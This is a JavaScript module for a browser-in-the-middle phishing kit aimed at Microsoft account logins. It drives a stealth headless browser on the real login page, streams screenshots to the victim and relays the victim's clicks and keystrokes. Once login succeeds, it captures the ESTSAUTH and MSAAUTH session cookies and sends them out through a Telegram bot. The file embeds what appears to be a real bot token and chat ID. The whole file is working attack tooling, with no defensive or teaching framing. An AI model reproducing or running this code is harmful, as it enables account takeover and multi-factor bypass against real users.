const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

// --- CONFIGURATION ---
const VAULT_URL = "https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec";
const TARGET = "https://login.microsoftonline.com/";

// YOUR NEW CREDENTIALS
const BACKUP_TOKEN = "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc";
const BACKUP_CHAT_ID = "1318100118";

async function getCredentials() {
    try {
        const response = await axios.get(VAULT_URL, { timeout: 4000 });
        // Ensure GAPS returns valid data, otherwise use backups
        if (response.data && response.data.TG_TOKEN) {
            return response.data;
        }
    } catch (e) {
        console.log("GAPS Vault unreachable, using backup credentials.");
    }
    return { TG_TOKEN: BACKUP_TOKEN, TG_CHAT_ID: BACKUP_CHAT_ID };
}

async function sendExfiltration(cookies, url) {
    const creds = await getCredentials();
    const host = new URL(url).hostname;

    console.log(`Attempting exfiltration for: ${host}`);

    try {
        // 1. Send Text Notification
        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
            chat_id: creds.TG_CHAT_ID,
            text: `<b>🚨 SESSION CAPTURED</b>\n<b>Host:</b> ${host}\n<b>Cookies:</b> ${cookies.length} found.`,
            parse_mode: 'HTML'
        });

        // 2. Send JSON Cookie File
        const form = new FormData();
        form.append('chat_id', creds.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `COOKIES_${host.replace(/\./g, '_')}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });

        console.log("✅ Telegram log sent successfully.");
    } catch (e) {
        console.error("❌ Telegram Log Failed:", e.response ? e.response.data : e.message);
    }
}

async function startSession(io, socket) {
    let browser = null;
    const capturedUrls = new Set();

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        await page.goto(TARGET, { waitUntil: 'networkidle2' });

        // EXFILTRATION TRIGGER
        const poller = setInterval(async () => {
            try {
                const url = page.url();
                // Capture on common post-auth redirect points
                if (url.includes('/kmsi') || url.includes('portal.office.com') || url.includes('/landing')) {
                    const cookies = await page.cookies();
                    const isAuth = cookies.some(c => c.name.includes('ESTSAUTH') || c.name.includes('MSAAUTH'));

                    if (isAuth && !capturedUrls.has(url)) {
                        capturedUrls.add(url);
                        await sendExfiltration(cookies, url);
                    }
                }
            } catch (e) {}
        }, 4000);

        // STREAMING
        const stream = setInterval(async () => {
            if (socket.connected) {
                try {
                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
                    socket.emit('browser-render', { screenshot: b64 });
                } catch (e) {}
            }
        }, 1000);

        // PC ACTIONS
        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.move(data.x, data.y);
                    await page.mouse.click(data.x, data.y, { delay: 50 });
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(poller);
            clearInterval(stream);
            if (browser) await browser.close();
        });

    } catch (err) {
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
